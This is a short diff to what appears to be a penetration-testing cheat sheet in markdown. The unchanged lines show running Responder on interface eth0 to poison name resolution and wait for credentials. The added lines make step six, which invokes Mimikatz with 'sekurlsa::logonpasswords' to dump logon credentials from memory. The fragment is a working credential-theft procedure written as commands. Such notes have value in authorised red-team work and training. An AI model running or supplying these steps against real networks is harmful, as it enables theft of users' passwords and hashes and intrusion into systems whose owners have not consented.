@@ -29,4 +29,10 @@ gedit Responder.conf
 Responder.py** -I eth0 -rdw
 ```
 5. Wait for creds
+6. Invoke standard Mimikatz
+```
+mimi sekurlsa::logonpasswords
+```
+
+
 
